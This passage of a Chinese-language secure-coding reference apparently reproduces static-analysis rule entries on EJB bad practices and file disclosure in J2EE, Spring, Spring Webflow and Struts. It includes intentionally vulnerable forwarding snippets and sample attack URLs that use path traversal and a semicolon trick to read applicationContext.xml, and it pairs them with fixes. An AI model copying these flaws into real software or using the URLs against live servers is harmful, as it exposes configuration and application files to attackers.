<p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[4] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 676</p>
<h4 id="Dangerous-Type"><a href="#Dangerous-Type" class="headerlink" title="Dangerous Type"></a>Dangerous Type</h4><h5 id="ABSTRACT-13"><a href="#ABSTRACT-13" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>这是标注为危险类型的变量。</p>
<h5 id="EXPLANATION-13"><a href="#EXPLANATION-13" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>已将注释 FortifyDangerous 应用于此类型。这被用来表示该类型危险，并且所有对其的使用都应进行安全性检查。</p>
<h5 id="RECOMMENDATIONS-13"><a href="#RECOMMENDATIONS-13" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>检查其用法以确保其正确性与安全性。</p>
<h5 id="REFERENCES-12"><a href="#REFERENCES-12" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<h4 id="EJB-Bad-Practices-Use-of-AWT-Swing"><a href="#EJB-Bad-Practices-Use-of-AWT-Swing" class="headerlink" title="EJB Bad Practices: Use of AWT/Swing"></a>EJB Bad Practices: Use of AWT/Swing</h4><h5 id="ABSTRACT-14"><a href="#ABSTRACT-14" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序使用了 AWT/Swing，这违反了企业级 JavaBeans 编程规范。</p>
<h5 id="EXPLANATION-14"><a href="#EXPLANATION-14" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>企业级 JavaBeans 编程规范要求每个 bean 提供者都必须遵守一系列编程规范，以确保 bean 在任何 EJB 容器 [1] 中的可移植性与行为的一致性。</p>
<p>在这里，程序违背了以下 EJB 指导原则：</p>
<p>“一个企业级 bean 必须禁止利用 AWT 机制，将信息输出到显示设备，或者通过键盘输入信息。”</p>
<p>制定该规范理由如下：</p>
<p>“大部分服务器都不允许应用程序中的程序与连接至服务器系统上的键盘/显示设备进行直接交互。”</p>
<h5 id="RECOMMENDATIONS-14"><a href="#RECOMMENDATIONS-14" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保在多部署环境中的可移植性与行为的一致性，应该严格遵守企业级 JavaBeans 规范中建议的指导原则。</p>
<h5 id="REFERENCES-13"><a href="#REFERENCES-13" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The Enterprise JavaBeans 2.1 Specification Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 575</p>
<h4 id="EJB-Bad-Practices-Use-of-Class-Loader"><a href="#EJB-Bad-Practices-Use-of-Class-Loader" class="headerlink" title="EJB Bad Practices: Use of Class Loader"></a>EJB Bad Practices: Use of Class Loader</h4><h5 id="ABSTRACT-15"><a href="#ABSTRACT-15" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序使用了程序类加载器，这违反了企业级 JavaBeans 编程规范。</p>
<h5 id="EXPLANATION-15"><a href="#EXPLANATION-15" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>企业级 JavaBeans 编程规范要求每个 bean 提供者都必须遵守一系列编程规范，以确保 bean 在任何 EJB 容器 [1] 中的可移植性与行为的一致性。</p>
<p>在这里，程序违背了以下 EJB 指导原则：</p>
<p>“企业级 bean 必须禁止以下内容：创建类加载器；获取当前类加载器；设置类加载器上下文；设置安全管理器；创建新的安全管理器；停止 JVM 或者篡改输入、输出及错误流。”</p>
<p>制定该规范理由如下：</p>
<p>“这些功能都是为 EJB 容器预留的。允许企业级 bean 使用这些功能会造成一些安全上的漏洞，并使容器无法正确地管理运行时环境。”</p>
<h5 id="RECOMMENDATIONS-15"><a href="#RECOMMENDATIONS-15" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保在多部署环境中的可移植性与行为的一致性，应该严格遵守企业级 JavaBeans 规范中建议的指导原则。</p>
<h5 id="REFERENCES-14"><a href="#REFERENCES-14" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The Enterprise JavaBeans 2.1 Specification Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 578</p>
<h4 id="EJB-Bad-Practices-Use-of-Sockets"><a href="#EJB-Bad-Practices-Use-of-Sockets" class="headerlink" title="EJB Bad Practices: Use of Sockets"></a>EJB Bad Practices: Use of Sockets</h4><h5 id="ABSTRACT-16"><a href="#ABSTRACT-16" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序使用了 socket 接口，这违反了企业级 JavaBeans 编程规范。</p>
<h5 id="EXPLANATION-16"><a href="#EXPLANATION-16" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>企业级 JavaBeans 编程规范要求每个 bean 提供者都必须遵守一系列编程规范，以确保 bean 在任何 EJB 容器 [1] 中的可移植性与行为的一致性。</p>
<p>在这里，程序违背了以下 EJB 指导原则：</p>
<p>“一个企业级 bean 必须禁止监听 Socket 接口、接受 Socket 连接或者使用 Socket 做多点传送。”</p>
<p>制定该规范理由如下：</p>
<p>“EJB 体系结构允许企业级 bean 实例作为网络 Socket 客户端来运行，但禁止其作为网络服务器来运行。而且，允许企业级 bean 实例作为网络服务器来运行与企业级 bean 的基本功能（为 EJB 客户端提供服务）相冲突。”</p>
<h5 id="RECOMMENDATIONS-16"><a href="#RECOMMENDATIONS-16" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保在多部署环境中的可移植性与行为的一致性，应该严格遵守企业级 JavaBeans 规范中建议的指导原则。</p>
<p>REFERENCES</p>
<p>[1] The Enterprise JavaBeans 2.1 Specification Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 577</p>
<h4 id="EJB-Bad-Practices-Use-of-Synchronization-Primitives"><a href="#EJB-Bad-Practices-Use-of-Synchronization-Primitives" class="headerlink" title="EJB Bad Practices: Use of Synchronization Primitives"></a>EJB Bad Practices: Use of Synchronization Primitives</h4><h5 id="ABSTRACT-17"><a href="#ABSTRACT-17" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序使用了多线程同步，这违反了企业级 JavaBeans 编程规范。</p>
<h5 id="EXPLANATION-17"><a href="#EXPLANATION-17" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>企业级 JavaBeans 编程规范要求每个 bean 提供者都必须遵守一系列编程规范，以确保 bean 在任何 EJB 容器 [1] 中的可移植性与行为的一致性。</p>
<p>在这里，程序违背了以下 EJB 指导原则：</p>
<p>“一个企业级 bean 必须禁止利用线程同步机制来同步执行多个实例。”</p>
<p>制定该规范理由如下：</p>
<p>“这一规则要求确保一致的运行时语义，因为一些 EJB 容器可能会使用单个 JVM 来执行所有 bean 实例，而其他一些可能会跨多个 JVM 分布各个 bean 实例。”</p>
<h5 id="RECOMMENDATIONS-17"><a href="#RECOMMENDATIONS-17" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保在多部署环境中的可移植性与行为的一致性，应该严格遵守企业级 JavaBeans 规范中建议的指导原则。</p>
<h5 id="REFERENCES-15"><a href="#REFERENCES-15" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The Enterprise JavaBeans 2.1 Specification Sun Microsystems</p>
<p>[2] THI01-J. Do not invoke ThreadGroup methods CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 574</p>
<h4 id="EJB-Bad-Practices-Use-of-java-io"><a href="#EJB-Bad-Practices-Use-of-java-io" class="headerlink" title="EJB Bad Practices: Use of java.io"></a>EJB Bad Practices: Use of java.io</h4><h5 id="ABSTRACT-18"><a href="#ABSTRACT-18" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序使用了 java.io 包，这违反了企业级 JavaBeans 编程规范。</p>
<h5 id="EXPLANATION-18"><a href="#EXPLANATION-18" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>企业级 JavaBeans 编程规范要求每个 bean 提供者都必须遵守一系列编程规范，以确保 bean 在任何 EJB 容器 [1] 中的可移植性与行为的一致性。</p>
<p>在这里，程序违背了以下 EJB 指导原则：</p>
<p>“一个企业级 bean 必须禁止利用 java.io 包访问 file system 中的文件和目录。”</p>
<p>制定该规范理由如下：</p>
<p>“file system API 不适用于商业组件的数据访问。商业组件应利用资源管理 API（如 JDBC）存储数据。”</p>
<h5 id="RECOMMENDATIONS-18"><a href="#RECOMMENDATIONS-18" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保在多部署环境中的可移植性与行为的一致性，应该严格遵守企业级 JavaBeans 规范中建议的指导原则。</p>
<h5 id="REFERENCES-16"><a href="#REFERENCES-16" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The Enterprise JavaBeans 2.1 Specification Sun Microsystems</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 576</p>
<h4 id="File-Disclosure-J2EE"><a href="#File-Disclosure-J2EE" class="headerlink" title="File Disclosure: J2EE"></a>File Disclosure: J2EE</h4><h5 id="ABSTRACT-19"><a href="#ABSTRACT-19" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若通过用户输入构造服务器端重定向路径，攻击者便能够下载应用程序二进制码（包括应用程序的类或 jar 文件）或者查看受保护的目录下的任意文件。</p>
<h5 id="EXPLANATION-19"><a href="#EXPLANATION-19" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下，会发生文件泄露：<br>1、 数据从一个不可信赖的数据源进入程序。</p>
<p>2、 数据用于动态地构造一个路径。</p>
<p>例 1：下面的代码会接受不可信赖的数据，并使用其构造服务器端转发所使用的路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String returnURL = request.getParameter(&quot;returnURL&quot;);</span><br><span class="line"></span><br><span class="line">	RequestDispatcher rd = request.getRequestDispatcher(returnURL);</span><br><span class="line"></span><br><span class="line">	rd.forward();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>例 2：下面的代码会接受不可信赖的数据，并使用其构造服务器端转发所使用的路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;% String returnURL = request.getParameter(&quot;returnURL&quot;); %&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jsp:include page=&quot;&lt;%=returnURL%&gt;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>如果攻击者使用请求参数提供与某个敏感文件位置相匹配的 URL，他们将能够查看该文件。例如，使用 “<a href="http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml”" target="_blank" rel="noopener">http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml”</a> 将能够查看该应用程序的 applicationContext.xml 文件。 一旦攻击者掌握了 applicationContext.xml 的信息，他们便能够定位和下载 applicationContext.xml 中引用的其他配置文件，甚至类文件或 jar 文件。这样一来，攻击者将能够获得与应用程序有关的敏感信息，并以之为目标发动其他类型的攻击。</p>
<h5 id="RECOMMENDATIONS-19"><a href="#RECOMMENDATIONS-19" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要要使用不可信赖的数据请求服务器端资源。而应使用介于位置与路径之间的间接方法。 请不要使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?nextPage=WEB-INF/signup.jsp&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>而应使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?nextPage=newCustomer&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>服务器端逻辑应具有逻辑名称与服务器端路径的映射（以逻辑名称为键），在上例中，键“newCustome”中存储的路径应为“/WEB-INF/signup.jsp”。</p>
<h5 id="REFERENCES-17"><a href="#REFERENCES-17" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ryan Berg and Dinis Cruz Two Security Vulnerabilities in the Spring Framework’s MVC</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 552</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 073</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 URL Redirector Abuse (WASC-38)</p>
<h4 id="File-Disclosure-Spring"><a href="#File-Disclosure-Spring" class="headerlink" title="File Disclosure: Spring"></a>File Disclosure: Spring</h4><h5 id="ABSTRACT-20"><a href="#ABSTRACT-20" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若通过用户输入构造服务器端重定向路径，攻击者便能够下载应用程序二进制码（包括应用程序的类或 jar 文件）或者查看受保护的目录下的任意文件。</p>
<h5 id="EXPLANATION-20"><a href="#EXPLANATION-20" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下，会发生文件泄露：<br>1、 数据从一个不可信赖的数据源进入程序。</p>
<p>2、 数据用于动态地构造一个路径。</p>
<p>例 1：下面的代码会接受不可信赖的数据，并使用其构造服务器端转发所使用的路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String returnURL = request.getParameter(&quot;returnURL&quot;);</span><br><span class="line"></span><br><span class="line">	return new ModelAndView(returnURL);</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>如果攻击者使用请求参数提供与某个敏感文件位置相匹配的 URL，他们将能够查看该文件。例如，使用 “<a href="http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml”" target="_blank" rel="noopener">http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml”</a> 将能够查看该应用程序的 applicationContext.xml 文件。 一旦攻击者掌握了 applicationContext.xml 的信息，他们便能够定位和下载 applicationContext.xml 中引用的其他配置文件，甚至类文件或 jar 文件。这样一来，攻击者将能够获得与应用程序有关的敏感信息，并以之为目标发动其他类型的攻击。</p>
<h5 id="RECOMMENDATIONS-20"><a href="#RECOMMENDATIONS-20" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要要使用不可信赖的数据请求服务器端资源。而应使用介于位置与路径之间的间接方法。 请不要使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?nextPage=WEB-INF/signup.jsp&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>而应使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?nextPage=newCustomer&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>服务器端逻辑应具有逻辑名称与服务器端路径的映射（以逻辑名称为键），在上例中，键“newCustome”中存储的路径应为“/WEB-INF/signup.jsp”。</p>
<h5 id="REFERENCES-18"><a href="#REFERENCES-18" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ryan Berg and Dinis Cruz Two Security Vulnerabilities in the Spring Framework’s MVC</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 552</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 073</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 URL Redirector Abuse (WASC-38)</p>
<h4 id="File-Disclosure-Spring-Webflow"><a href="#File-Disclosure-Spring-Webflow" class="headerlink" title="File Disclosure: Spring Webflow"></a>File Disclosure: Spring Webflow</h4><h5 id="ABSTRACT-21"><a href="#ABSTRACT-21" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若通过用户输入构造服务器端重定向路径，攻击者便能够下载应用程序二进制码（包括应用程序的类或 jar 文件）或者查看受保护的目录下的任意文件。</p>
<h5 id="EXPLANATION-21"><a href="#EXPLANATION-21" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring Webflow 使用视图解析器将视图名称转换为真实渲染语言。通常情况下，视图解析器会限制带有前缀和后缀的文件的类型和位置。然而，使用请求参数来指定视图名称可回避这一限制机制。 例 1：下面的 Spring Webflow 配置会使用请求参数指定视图名称。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;webflow:end-state id=&quot;finalStep&quot; view=&quot;$&#123;requestParameters.url&#125;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;webflow:view-state id=&quot;showView&quot; view=&quot;$&#123;requestParameters.test&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>默认的 Spring Webflow 视图解析器仅用于允许对 “/WEB-INF/views/” 目录下的 jsp 文件进行解析。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean class=&quot;org.springframework.web.servlet.view.</span><br><span class="line"></span><br><span class="line">               InternalResourceViewResolver&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<p>攻击者可以使用如下 URL 查看 applicationContext.xml 文件：“<a href="http://www.yourcorp.com/webApp/logic?url=../applicationContext.xml;x=”" target="_blank" rel="noopener">http://www.yourcorp.com/webApp/logic?url=../applicationContext.xml;x=”</a> InternalResourceViewResolver 会携带其配置中包含的前缀，然后连接通过视图属性传递的值，最终加上后缀。 生成的相对 URL“/WEB-INF/views/../applicationContext.xml;x=.jsp”将传递到服务器端请求发送器。其中的分号可允许攻击者将“.jsp”后缀转换为路径参数。此攻击可用于暴露 web app 根目录下的所有文件。</p>
<h5 id="RECOMMENDATIONS-21"><a href="#RECOMMENDATIONS-21" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要传递不可信任的数据来查看 Spring Webflow 步骤的属性，而应使用介于位置与路径之间的间接方法。请确保使用适当范围的 Spring EL 变量来设置视图属性，并保证这些变量不会允许不可信任的数据传递到系统中。 请不要使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?url=WEB-INF/signup.jsp&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>而应使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?url=newCustomer&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>服务器端逻辑应具有逻辑名称与服务器端路径的映射（以逻辑名称为键），在上例中，键“newCustome”中存储的路径应为“/WEB-INF/signup.jsp”。然后，应将路径值设置为在 Spring Webflow 配置文件中作为视图属性值配置的适当范围的 Spring EL 变量。</p>
<h5 id="REFERENCES-19"><a href="#REFERENCES-19" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ryan Berg and Dinis Cruz Two Security Vulnerabilities in the Spring Framework’s MVC</p>
<p>[2] Seth Ladd Expert Spring MVC and Web Flow</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 552</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 073</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 URL Redirector Abuse (WASC-38)</p>
<h4 id="File-Disclosure-Struts"><a href="#File-Disclosure-Struts" class="headerlink" title="File Disclosure: Struts"></a>File Disclosure: Struts</h4><h5 id="ABSTRACT-22"><a href="#ABSTRACT-22" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若通过用户输入构造服务器端重定向路径，攻击者便能够下载应用程序二进制码（包括应用程序的类或 jar 文件）或者查看受保护的目录下的任意文件。</p>
<h5 id="EXPLANATION-22"><a href="#EXPLANATION-22" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下，会发生文件泄露：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个路径。</p>
</li>
</ol>
<p>例 1：下面的代码会接受不可信赖的数据，并使用其构造服务器端转发所使用的路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	String returnURL = request.getParameter(&quot;returnURL&quot;);</span><br><span class="line"></span><br><span class="line">	return new ActionForward(returnURL);</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>如果攻击者使用请求参数提供与某个敏感文件位置相匹配的 URL，他们将能够查看该文件。例如，使用 “<a href="http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml”" target="_blank" rel="noopener">http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml”</a> 将能够查看该应用程序的 applicationContext.xml 文件。 一旦攻击者掌握了 applicationContext.xml 的信息，他们便能够定位和下载 applicationContext.xml 中引用的其他配置文件，甚至类文件或 jar 文件。这样一来，攻击者将能够获得与应用程序有关的敏感信息，并以之为目标发动其他类型的攻击。</p>
<h5 id="RECOMMENDATIONS-22"><a href="#RECOMMENDATIONS-22" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要要使用不可信赖的数据请求服务器端资源。而应使用介于位置与路径之间的间接方法。 请不要使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?nextPage=WEB-INF/signup.jsp&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>而应使用：</p>
<p><code>&lt; a href=&quot;http://www.yourcorp.com/webApp/logic?nextPage=newCustomer&quot;&gt;New Customer&lt;/a&gt;</code></p>
<p>服务器端逻辑应具有逻辑名称与服务器端路径的映射（以逻辑名称为键），在上例中，键“newCustome”中存储的路径应为“/WEB-INF/signup.jsp”。</p>
<h5 id="REFERENCES-20"><a href="#REFERENCES-20" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Ryan Berg and Dinis Cruz Two Security Vulnerabilities in the Spring Framework’s MVC</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 552</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 073</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 URL Redirector Abuse (WASC-38)</p>
